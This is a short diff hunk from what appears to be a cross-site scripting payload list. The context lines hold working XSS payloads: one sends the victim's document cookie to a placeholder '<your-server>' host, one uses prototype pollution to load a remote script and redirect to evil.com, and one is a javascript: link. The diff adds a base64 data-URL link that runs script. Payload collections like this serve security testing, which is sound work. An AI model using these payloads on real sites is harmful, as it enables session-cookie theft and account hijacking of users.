@@ -19,6 +19,7 @@ window/*xxx*/['loca' + 'tion'] = 'http://<your-server>?cookie=' + document/*xxx*
 }<x>xxx<!--><!>+>+></Script+xxx><Script+xxx>Object.prototype.BOOMR = 1;Object.prototype.url = 'https://portswigger-labs.net/xss/xss.js';location.replace('https://evil.com');</script%20x></x><x>xxx<!--><!>+>+>
 }<x>xxx<!--><!>+>+></Script+xxx></script%20x></x><x>xxx<!--><!>+>+>
 "[Click me](javascript:alert('XSS'))"
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click here</a>
 
 
 
